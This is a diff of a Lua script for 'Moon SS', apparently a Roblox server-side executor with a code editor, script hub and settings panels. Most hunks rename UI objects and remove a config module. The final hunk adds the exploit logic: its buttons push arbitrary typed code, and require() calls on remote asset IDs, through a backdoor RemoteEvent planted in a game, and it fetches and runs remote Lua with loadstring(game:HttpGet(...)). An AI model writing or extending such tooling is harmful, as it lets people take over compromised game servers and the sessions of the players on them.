@@ -103,8 +103,6 @@ local Lines_2 = Instance.new("TextLabel")
 local UIGradient_2 = Instance.new("UIGradient")
 local UICorner_20 = Instance.new("UICorner")
 local UIListLayout_5 = Instance.new("UIListLayout")
-local Lines_3 = Instance.new("Frame")
-local TextLabel_5 = Instance.new("TextLabel")
 local Predict = Instance.new("Frame")
 local Icon = Instance.new("ImageLabel")
 local Label_5 = Instance.new("TextLabel")
@@ -117,18 +115,18 @@ local Settings_2 = Instance.new("Frame")
 local WindowTitle = Instance.new("TextLabel")
 local UIAnim = Instance.new("TextButton")
 local UICorner_22 = Instance.new("UICorner")
-local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
 local Info1 = Instance.new("TextLabel")
-local TextLabel_7 = Instance.new("TextLabel")
+local TextLabel_6 = Instance.new("TextLabel")
 local SyntaxHighlighting = Instance.new("TextButton")
 local UICorner_23 = Instance.new("UICorner")
 local Info2 = Instance.new("TextLabel")
-local TextLabel_8 = Instance.new("TextLabel")
+local TextLabel_7 = Instance.new("TextLabel")
 local Info3 = Instance.new("TextLabel")
 local HideUsername = Instance.new("TextButton")
 local UICorner_24 = Instance.new("UICorner")
 local ImageLabel_2 = Instance.new("ImageLabel")
-local TextLabel_9 = Instance.new("TextLabel")
+local TextLabel_8 = Instance.new("TextLabel")
 local Open = Instance.new("ImageButton")
 local NotificationD = Instance.new("Frame")
 local UIListLayout_6 = Instance.new("UIListLayout")
@@ -1185,27 +1183,6 @@ UIListLayout_5.Parent = ExecuBox
 UIListLayout_5.FillDirection = Enum.FillDirection.Horizontal
 UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
 
-Lines_3.Name = "Lines"
-Lines_3.Parent = Main
-Lines_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Lines_3.BackgroundTransparency = 1.000
-Lines_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Lines_3.BorderSizePixel = 0
-Lines_3.Size = UDim2.new(0, 41, 0, 446)
-Lines_3.Visible = false
-
-TextLabel_5.Parent = Lines_3
-TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.BackgroundTransparency = 1.000
-TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_5.BorderSizePixel = 0
-TextLabel_5.Size = UDim2.new(0, 41, 0, 446)
-TextLabel_5.Font = Enum.Font.SourceSans
-TextLabel_5.Text = "1\\n2"
-TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextSize = 14.000
-TextLabel_5.TextYAlignment = Enum.TextYAlignment.Top
-
 Predict.Name = "Predict"
 Predict.Parent = Main
 Predict.BackgroundColor3 = Color3.fromRGB(32, 34, 43)
@@ -1329,19 +1306,19 @@ UIAnim.TextWrapped = true
 UICorner_22.CornerRadius = UDim.new(0, 3)
 UICorner_22.Parent = UIAnim
 
-TextLabel_6.Parent = Settings_2
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
-TextLabel_6.BackgroundTransparency = 0.800
-TextLabel_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
-TextLabel_6.Position = UDim2.new(0, 0, 0.115797326, 0)
-TextLabel_6.Size = UDim2.new(0, 360, 0, 34)
-TextLabel_6.SizeConstraint = Enum.SizeConstraint.RelativeYY
-TextLabel_6.Font = Enum.Font.SourceSans
-TextLabel_6.Text = " UI Animations"
-TextLabel_6.TextColor3 = Color3.fromRGB(194, 198, 202)
-TextLabel_6.TextSize = 32.000
-TextLabel_6.TextWrapped = true
-TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_5.Parent = Settings_2
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel_5.BackgroundTransparency = 0.800
+TextLabel_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_5.Position = UDim2.new(0, 0, 0.115797326, 0)
+TextLabel_5.Size = UDim2.new(0, 360, 0, 34)
+TextLabel_5.SizeConstraint = Enum.SizeConstraint.RelativeYY
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = " UI Animations"
+TextLabel_5.TextColor3 = Color3.fromRGB(194, 198, 202)
+TextLabel_5.TextSize = 32.000
+TextLabel_5.TextWrapped = true
+TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
 
 Info1.Name = "Info1"
 Info1.Parent = Settings_2
@@ -1359,18 +1336,18 @@ Info1.TextSize = 32.000
 Info1.TextWrapped = true
 Info1.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_7.Parent = Settings_2
-TextLabel_7.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
-TextLabel_7.BackgroundTransparency = 0.800
-TextLabel_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
-TextLabel_7.Position = UDim2.new(0, 0, 0.32112065, 0)
-TextLabel_7.Size = UDim2.new(0, 360, 0, 34)
-TextLabel_7.Font = Enum.Font.SourceSans
-TextLabel_7.Text = " Syntax Highlighting"
-TextLabel_7.TextColor3 = Color3.fromRGB(194, 198, 202)
-TextLabel_7.TextSize = 32.000
-TextLabel_7.TextWrapped = true
-TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_6.Parent = Settings_2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel_6.BackgroundTransparency = 0.800
+TextLabel_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_6.Position = UDim2.new(0, 0, 0.32112065, 0)
+TextLabel_6.Size = UDim2.new(0, 360, 0, 34)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = " Syntax Highlighting"
+TextLabel_6.TextColor3 = Color3.fromRGB(194, 198, 202)
+TextLabel_6.TextSize = 32.000
+TextLabel_6.TextWrapped = true
+TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
 
 SyntaxHighlighting.Name = "SyntaxHighlighting"
 SyntaxHighlighting.Parent = Settings_2
@@ -1405,19 +1382,19 @@ Info2.TextSize = 32.000
 Info2.TextWrapped = true
 Info2.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_8.Parent = Settings_2
-TextLabel_8.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
-TextLabel_8.BackgroundTransparency = 0.800
-TextLabel_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
-TextLabel_8.Position = UDim2.new(0, 0, 0.692254543, 0)
-TextLabel_8.Size = UDim2.new(0, 360, 0, 34)
-TextLabel_8.Visible = false
-TextLabel_8.Font = Enum.Font.SourceSans
-TextLabel_8.Text = " Hide username (in executor)"
-TextLabel_8.TextColor3 = Color3.fromRGB(194, 198, 202)
-TextLabel_8.TextSize = 32.000
-TextLabel_8.TextWrapped = true
-TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_7.Parent = Settings_2
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel_7.BackgroundTransparency = 0.800
+TextLabel_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_7.Position = UDim2.new(0, 0, 0.692254543, 0)
+TextLabel_7.Size = UDim2.new(0, 360, 0, 34)
+TextLabel_7.Visible = false
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = " Hide username (in executor)"
+TextLabel_7.TextColor3 = Color3.fromRGB(194, 198, 202)
+TextLabel_7.TextSize = 32.000
+TextLabel_7.TextWrapped = true
+TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
 
 Info3.Name = "Info3"
 Info3.Parent = Settings_2
@@ -1462,18 +1439,18 @@ ImageLabel_2.Size = UDim2.new(0, 90, 0, 90)
 ImageLabel_2.Image = "rbxassetid://11412550867"
 ImageLabel_2.ImageColor3 = Color3.fromRGB(0, 234, 255)
 
-TextLabel_9.Parent = Settings_2
-TextLabel_9.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
-TextLabel_9.BackgroundTransparency = 0.800
-TextLabel_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
-TextLabel_9.Position = UDim2.new(-0.00102113315, 0, 0.874458849, 0)
-TextLabel_9.Size = UDim2.new(0, 367, 0, 35)
-TextLabel_9.Font = Enum.Font.SourceSans
-TextLabel_9.Text = "This section is currently still being worked on!"
-TextLabel_9.TextColor3 = Color3.fromRGB(194, 198, 202)
-TextLabel_9.TextScaled = true
-TextLabel_9.TextSize = 32.000
-TextLabel_9.TextWrapped = true
+TextLabel_8.Parent = Settings_2
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel_8.BackgroundTransparency = 0.800
+TextLabel_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_8.Position = UDim2.new(-0.00102113315, 0, 0.874458849, 0)
+TextLabel_8.Size = UDim2.new(0, 367, 0, 35)
+TextLabel_8.Font = Enum.Font.SourceSans
+TextLabel_8.Text = "This section is currently still being worked on!"
+TextLabel_8.TextColor3 = Color3.fromRGB(194, 198, 202)
+TextLabel_8.TextScaled = true
+TextLabel_8.TextSize = 32.000
+TextLabel_8.TextWrapped = true
 
 Open.Name = "Open"
 Open.Parent = MoonExecu
@@ -1575,56 +1552,18 @@ UICorner_26.Parent = Title
 UICorner_27.CornerRadius = UDim.new(0, 3)
 UICorner_27.Parent = Notification
 
--- Module Scripts:
-
-local fake_module_scripts = {}
-
-do -- MoonExecu.Config
-	local script = Instance.new('ModuleScript', MoonExecu)
-	script.Name = "Config"
-	local function module_script()
-		local settings = {
-			["UIAnimations"] = true,
-			["SyntaxHighlighting"] = true,
-			["HideUsername"] = false
-		}
-		
-		return settings
-		
-	end
-	fake_module_scripts[script] = module_script
-end
-
-
 -- Scripts:
 
--- MoonExecu.Source is disabled.
-local function QHQYDPK_fake_script() -- Close.LocalScript 
+local function DMLVTRZ_fake_script() -- Close.LocalScript 
 	local script = Instance.new('LocalScript', Close)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(QHQYDPK_fake_script)()
-local function PJLYIDE_fake_script() -- Console.Drag 
+coroutine.wrap(DMLVTRZ_fake_script)()
+local function SBESTSA_fake_script() -- Console.Drag 
 	local script = Instance.new('LocalScript', Console)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local UserInputService = game:GetService("UserInputService")
 	
@@ -1666,17 +1605,9 @@ local function PJLYIDE_fake_script() -- Console.Drag
 		end
 	end)
 end
-coroutine.wrap(PJLYIDE_fake_script)()
-local function QTTGXK_fake_script() -- Main.Drag 
+coroutine.wrap(SBESTSA_fake_script)()
+local function MXKTUY_fake_script() -- Main.Drag 
 	local script = Instance.new('LocalScript', Main)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local UserInputService = game:GetService("UserInputService")
 	
@@ -1718,17 +1649,9 @@ local function QTTGXK_fake_script() -- Main.Drag
 		end
 	end)
 end
-coroutine.wrap(QTTGXK_fake_script)()
-local function EOZSZ_fake_script() -- ScriptHub.LocalScript 
+coroutine.wrap(MXKTUY_fake_script)()
+local function VYEGB_fake_script() -- ScriptHub.LocalScript 
 	local script = Instance.new('LocalScript', ScriptHub)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local searchBar = script.Parent.SearchBar
 	local items = script.Parent.Frame
@@ -1753,17 +1676,9 @@ local function EOZSZ_fake_script() -- ScriptHub.LocalScript
 	
 	searchBar.Changed:Connect(UpdateResults)
 end
-coroutine.wrap(EOZSZ_fake_script)()
-local function HSUXKXL_fake_script() -- Frame.Main2 
+coroutine.wrap(VYEGB_fake_script)()
+local function MJJG_fake_script() -- Frame.Main2 
 	local script = Instance.new('LocalScript', Frame)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local addScript = script.Parent.Parent.Parent.Parent:FindFirstChild("Main"):FindFirstChild("addScript")
 	local scriptBox = addScript:FindFirstChild("scriptBOX").Source
@@ -1773,7 +1688,6 @@ local function HSUXKXL_fake_script() -- Frame.Main2
 	local SampleBTN = script.Parent.Parent:FindFirstChild("SampleBTN")
 	local ExecuteBox = script.Parent.Parent.Parent:FindFirstChild("ExecuBox"):FindFirstChild("Source")
 	local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexDevlpr/JSON-Config-Library-for-Roblox-Lua/main/Library.lua"))()
-	local config = require(script.Parent.Parent.Parent.Parent.Config)
 	local uploadedScripts = {}
 	function saveSettings()
 		local settings = {
@@ -1850,22 +1764,12 @@ local function HSUXKXL_fake_script() -- Frame.Main2
 	end)
 	
 end
-coroutine.wrap(HSUXKXL_fake_script)()
-local function NLBRE_fake_script() -- scriptBOX.Main 
+coroutine.wrap(MJJG_fake_script)()
+local function UDMYI_fake_script() -- scriptBOX.Main 
 	local script = Instance.new('LocalScript', scriptBOX)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
-	local settings1 = require(script.Parent.Parent.Parent.Parent.Config)
-	
 	local settings = {
-		Highlight = settings1.SyntaxHighlighting; -- Highlight like you know. Script Text color?
+		Highlight = true; -- Highlight like you know. Script Text color?
 		Lines = false; -- The textbox will have some lines like when you press enter.
 		Scroll = true; -- So if it has alot of lines and that it gets off the screen this will help.
 		HighlightVariables=true;--Highlights the local and global enviorments
@@ -2517,23 +2421,14 @@ local function NLBRE_fake_script() -- scriptBOX.Main
 		end)
 	end
 end
-coroutine.wrap(NLBRE_fake_script)()
+coroutine.wrap(UDMYI_fake_script)()
 -- Comments_.LocalScript is disabled.
-local function YAQM_fake_script() -- Main.Tabs 
+local function GDNR_fake_script() -- Main.Tabs 
 	local script = Instance.new('LocalScript', Main)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local TweenService = game:GetService("TweenService")
 	local HttpService = game:GetService("HttpService")
 	local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexDevlpr/JSON-Config-Library-for-Roblox-Lua/main/Library.lua"))()
-	local config = require(script.Parent.Parent.Config)
 	
 	local main = script.Parent
 	local Tabs = main:WaitForChild("Tabs")
@@ -2542,8 +2437,8 @@ local function YAQM_fake_script() -- Main.Tabs
 	local ExecuBox = main:FindFirstChild("ExecuBox") and main:FindFirstChild("ExecuBox"):FindFirstChild("Source")
 	
 	local settings = {
-		UIAnimations = config.UIAnimations,
-		SyntaxHighlighting = config.SyntaxHighlighting,
+		UIAnimations = true,
+		SyntaxHighlighting = true,
 		tabs = {}  -- This will store the content of each tab
 	}
 	
@@ -2797,17 +2692,9 @@ local function YAQM_fake_script() -- Main.Tabs
 	updateAddButtonVisibility()
 	
 end
-coroutine.wrap(YAQM_fake_script)()
-local function VNEX_fake_script() -- Main.PredictALPHA 
+coroutine.wrap(GDNR_fake_script)()
+local function AEIFD_fake_script() -- Main.PredictALPHA 
 	local script = Instance.new('LocalScript', Main)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local textBox = script.Parent.ExecuBox:FindFirstChild("Source")
 	local predictionFrame = script.Parent:WaitForChild("Predict")
@@ -2997,18 +2884,10 @@ local function VNEX_fake_script() -- Main.PredictALPHA
 	end)
 	
 end
-coroutine.wrap(VNEX_fake_script)()
+coroutine.wrap(AEIFD_fake_script)()
 -- Comments__2.LocalScript is disabled.
-local function ONIXRRF_fake_script() -- ExecuBox.Main 
+local function YWQZF_fake_script() -- ExecuBox.Main 
 	local script = Instance.new('LocalScript', ExecuBox)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local settings = {
 		Highlight = true; -- Highlight like you know. Script Text color?
@@ -3662,17 +3541,9 @@ local function ONIXRRF_fake_script() -- ExecuBox.Main
 		end)
 	end
 end
-coroutine.wrap(ONIXRRF_fake_script)()
-local function YIMT_fake_script() -- detail_3.LocalScript 
+coroutine.wrap(YWQZF_fake_script)()
+local function VFUUK_fake_script() -- detail_3.LocalScript 
 	local script = Instance.new('LocalScript', detail_3)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	-- Define the UI element
 	local uiElement = script.Parent -- adjust this if the script is not a direct child of the UI element
@@ -3692,17 +3563,9 @@ local function YIMT_fake_script() -- detail_3.LocalScript
 	tween:Play()
 	
 end
-coroutine.wrap(YIMT_fake_script)()
-local function NSQEK_fake_script() -- detail_4.LocalScript 
+coroutine.wrap(VFUUK_fake_script)()
+local function TEAYEC_fake_script() -- detail_4.LocalScript 
 	local script = Instance.new('LocalScript', detail_4)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	-- Define the UI element
 	local uiElement = script.Parent -- adjust this if the script is not a direct child of the UI element
@@ -3722,17 +3585,9 @@ local function NSQEK_fake_script() -- detail_4.LocalScript
 	tween:Play()
 	
 end
-coroutine.wrap(NSQEK_fake_script)()
-local function WPNEC_fake_script() -- detail_5.LocalScript 
+coroutine.wrap(TEAYEC_fake_script)()
+local function VKPBC_fake_script() -- detail_5.LocalScript 
 	local script = Instance.new('LocalScript', detail_5)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	-- Define the UI element
 	local uiElement = script.Parent -- adjust this if the script is not a direct child of the UI element
@@ -3752,29 +3607,25 @@ local function WPNEC_fake_script() -- detail_5.LocalScript
 	tween:Play()
 	
 end
-coroutine.wrap(WPNEC_fake_script)()
-local function ZOGTKN_fake_script() -- Settings_2.Main 
+coroutine.wrap(VKPBC_fake_script)()
+local function ZIRY_fake_script() -- Settings_2.Main 
 	local script = Instance.new('LocalScript', Settings_2)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local UIAnim = script.Parent:FindFirstChild("UIAnim")
 	local SyntaxHighlighting = script.Parent:FindFirstChild("SyntaxHighlighting")
 	local HideUsername = script.Parent:FindFirstChild("HideUsername")
 	
 	local Tween = game:GetService("TweenService")
-	local settings = require(script.Parent.Parent:FindFirstChild("Config"))
 	
 	---
 	local Label1 = script.Parent:FindFirstChild("Info1")
 	local Label2 = script.Parent:FindFirstChild("Info2")
 	local Label3 = script.Parent:FindFirstChild("Info3")
+	
+	local settings = { --hotpatch fix
+		["UIAnimations"] = true, -- TRUE: Allows UI Animations FALSE: Disables UI Animations
+		["SnytaxHighlighting"] = true -- TRUE: Allows syntax highlighting in any box that supports it FALSE: Disables syntax highlighting altogether
+	}
 	
 	local function turnNew(me, animate)
 		local Parent = me
@@ -3855,7 +3706,7 @@ local function ZOGTKN_fake_script() -- Settings_2.Main
 	local hideusername = false
 	
 	-- Declare toggle outside the function to maintain state
-	if settings.UIAnimations == false then
+	if settings.ui == false then
 		uianim = false
 		turnBack(UIAnim, false)
 		Label1.Visible = false
@@ -3957,17 +3808,9 @@ local function ZOGTKN_fake_script() -- Settings_2.Main
 		end
 	end)
 end
-coroutine.wrap(ZOGTKN_fake_script)()
-local function NIFHI_fake_script() -- Settings_2.Drag 
+coroutine.wrap(ZIRY_fake_script)()
+local function YXYJFGT_fake_script() -- Settings_2.Drag 
 	local script = Instance.new('LocalScript', Settings_2)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local UserInputService = game:GetService("UserInputService")
 	
@@ -4009,17 +3852,9 @@ local function NIFHI_fake_script() -- Settings_2.Drag
 		end
 	end)
 end
-coroutine.wrap(NIFHI_fake_script)()
-local function MWWJZHW_fake_script() -- Open.Drag 
+coroutine.wrap(YXYJFGT_fake_script)()
+local function EJJS_fake_script() -- Open.Drag 
 	local script = Instance.new('LocalScript', Open)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	local UserInputService = game:GetService("UserInputService")
 	
@@ -4061,17 +3896,9 @@ local function MWWJZHW_fake_script() -- Open.Drag
 		end
 	end)
 end
-coroutine.wrap(MWWJZHW_fake_script)()
-local function FALTE_fake_script() -- detail_6.LocalScript 
+coroutine.wrap(EJJS_fake_script)()
+local function LEILRQ_fake_script() -- detail_6.LocalScript 
 	local script = Instance.new('LocalScript', detail_6)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	-- Define the UI element
 	local uiElement = script.Parent -- adjust this if the script is not a direct child of the UI element
@@ -4091,17 +3918,9 @@ local function FALTE_fake_script() -- detail_6.LocalScript
 	tween:Play()
 	
 end
-coroutine.wrap(FALTE_fake_script)()
-local function PHECL_fake_script() -- detail_7.LocalScript 
+coroutine.wrap(LEILRQ_fake_script)()
+local function YPCGDTX_fake_script() -- detail_7.LocalScript 
 	local script = Instance.new('LocalScript', detail_7)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	-- Define the UI element
 	local uiElement = script.Parent -- adjust this if the script is not a direct child of the UI element
@@ -4121,42 +3940,38 @@ local function PHECL_fake_script() -- detail_7.LocalScript
 	tween:Play()
 	
 end
-coroutine.wrap(PHECL_fake_script)()
-local function BGYMPS_fake_script() -- MoonExecu.Rewrite 
+coroutine.wrap(YPCGDTX_fake_script)()
+local function YUVOAF_fake_script() -- MoonExecu.Rewrite 
 	local script = Instance.new('LocalScript', MoonExecu)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
 
 	--[[
 	
-	 	 __  __   ____    ____   _   _ 
-	 	|  \/  | / __ \  / __ \ | \ | |
-	 	| \  / || |  | || |  | ||  \| |
-		 | |\/| || |  | || |  | || . ` |
-	 	| |  | || |__| || |__| || |\  |
-	 	|_|  |_| \____/  \____/ |_| \_|
+	     __  __   ____    ____   _   _ 
+	    |  \/  | / __ \  / __ \ | \ | |
+	    | \  / || |  | || |  | ||  \| |
+	     | |\/| || |  | || |  | || . ` |
+	    | |  | || |__| || |__| || |\  |
+	    |_|  |_| \____/  \____/ |_| \_|
 	                                
-	 	REWRITTEN (FREE VERSION)
+	    REWRITTEN (FREE VERSION)
 	
 	--]]
 	
 	--// Vars
-	
+	warn("bro is this even being ran?")
 	local plr = game.Players.LocalPlayer
-	local settings = require(script.Parent:FindFirstChild("Config"))
 	local bd = game:GetService("InsertService"):FindFirstChild("Services") and game:GetService("InsertService"):FindFirstChild("Services"):FindFirstChild("InsertModel")
 	local serverResponse = game:GetService("InsertService"):FindFirstChild("Services") and game:GetService("InsertService"):FindFirstChild("Services"):FindFirstChild("GetModelData")
-	
+	warn("1")
 	--// UI Vars
+	local MainGUI = script.Parent
 	local Main = script.Parent:FindFirstChild("Main")
 	local ExecuBox = Main and Main:FindFirstChild("ExecuBox") and Main:FindFirstChild("ExecuBox"):FindFirstChild("Source")
 	local SideBar = Main and Main:FindFirstChild("SideFrame")
+	local ExecuteBTN = Main and SideBar:FindFirstChild("Execute")
+	local R6BTN = Main and SideBar:FindFirstChild("R6")
+	local ClearBTN = Main and SideBar:FindFirstChild('Clear')
+	local RespawnBTN = Main and SideBar:FindFirstChild('Respawn')
 	local Side = Main and Main:FindFirstChild("Side")
 	local Console = script.Parent:FindFirstChild("Console")
 	local ConsoleFrame = Console and Console:FindFirstChild("Console")
@@ -4168,24 +3983,109 @@ local function BGYMPS_fake_script() -- MoonExecu.Rewrite
 	local CLabelN2 = Console:FindFirstChild("Normal"):FindFirstChild("Label")
 	local CLabelE2 = Console:FindFirstChild("Error"):FindFirstChild("Label")
 	local CLabelW2 = Console:FindFirstChild("Warning"):FindFirstChild("Label")
-	
+	warn("2")
 	--// Miscellaneous Vars
+	local Title = "Moon SS"
+	local Backdoor = useableBackdoor -- GetGenv (Auto assigns 'useableBackdoor' dw bout it) 
+	warn("3")
+	warn("USEABLE BACKDOOR HAHAHAHAHA:"..tostring(Backdoor))
+	
+	-- If the Backdoor == "Moon" do Moon logic
+	-- If the Backdoor is not == "Moon" do non Moon logic
+	
+	-- BD = Moon Developed Backdoor
+	-- Backdoor = NON Moon Developed Backdoor
+	local alertLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/phobosv211/Moon-SS/main/alertLIB'))()
+	local Other = nil
+	warn("4")
 	
 	local devSettings = {
-		["isTesting"] = true, --TRUE: Disables any executor references so the script does not break FALSE: Allows executor references
-		["allowBDX"] = false, --TRUE: Allows the user to execute code that deletes the backdoor FALSE: Does not allow deletion of the backdoor
+		["isTesting"] = true, -- TRUE: Disables any executor references so the script does not break FALSE: Allows executor references
+		["allowBDX"] = false, -- TRUE: Allows the user to execute code that deletes the backdoor FALSE: Does not allow deletion of the backdoor
 		["classicNotifs"] = false -- TRUE: Uses classic notifications (may help with performance) FALSE: Uses modern notifications
 	}
 	
 	local userSettings = {
-		["UIAnimations"] = true, --TRUE: Allows UI Animations FALSE: Disables UI Animations
-		["SnytaxHighlighting"] = true -- TRUE Allows syntax highlighting in any box that supports it FALSE: Disables syntax highlighting all together
+		["UIAnimations"] = true, -- TRUE: Allows UI Animations FALSE: Disables UI Animations
+		["SnytaxHighlighting"] = true -- TRUE: Allows syntax highlighting in any box that supports it FALSE: Disables syntax highlighting altogether
 	}
 	
-	local Backdoor = backdoor
 	
 	--// Functions
+	ExecuteBTN.MouseButton1Click:Connect(function()
+		if Backdoor == "Moon" then
+			if bd and serverResponse then
+				local success, result = pcall(function()
+					bd:FireServer(ExecuBox.Text)
+				end)
+			end
+		else
+			local success, result = pcall(function()
+				Backdoor:FireServer(ExecuBox.Text)
+			end)
 	
+			if success then
+				alertLib.Success(MainGUI, Title, 'Executed script!')
+			else
+				alertLib.Error(MainGUI, Title, 'Failed to execute script!')
+			end
+		end
+	end)
+	
+	R6BTN.MouseButton1Click:Connect(function()
+		if Backdoor == "Moon" then
+			if bd and serverResponse then
+				local success, result = pcall(function()
+					bd:FireServer('require(18166157179).Dummy("'..game.Players.LocalPlayer.Name..'")')
+				end)
+				if success then
+					alertLib.Success(MainGUI, Title, 'Converted to R6!')
+				else
+					alertLib.Error(MainGUI, Title, 'Failed to convert to R6!')
+				end
+			end
+		else
+			local success, result = pcall(function()
+				Backdoor:FireServer('require(18166157179).Dummy("'..game.Players.LocalPlayer.Name..'")')
+			end)
+			if success then
+				alertLib.Success(MainGUI, Title, 'Converted to R6!')
+			else
+				alertLib.Error(MainGUI, Title, 'Failed to convert to R6!')
+			end
+		end
+	end)
+	
+	RespawnBTN.MouseButton1Click:Connect(function()
+		Other = "Respawn"
+		if Backdoor == "Moon" then
+			if bd and serverResponse then
+				local success, result = pcall(function()
+					bd:FireServer(plr, Other)
+				end)
+				if success then
+					alertLib.Success(MainGUI, Title, 'Respawned!')
+				else
+					alertLib.Error(MainGUI, Title, 'Failed to respawn!')
+				end
+			end
+		else
+			local success, result = pcall(function()
+				Backdoor:FireServer('require(10796895415).load("'..game.Players.LocalPlayer.Name..'")')
+			end)
+			if success then
+				alertLib.Success(MainGUI, Title, 'Respawned!')
+			else
+				alertLib.Error(MainGUI, Title, 'Failed to respawn!')
+			end
+		end
+	end)
+	
+	ClearBTN.MouseButton1Click:Connect(function()
+		if ExecuBox then
+			ExecuBox.Text = ""
+		end
+	end)
 	
 end
-coroutine.wrap(BGYMPS_fake_script)()
+coroutine.wrap(YUVOAF_fake_script)()
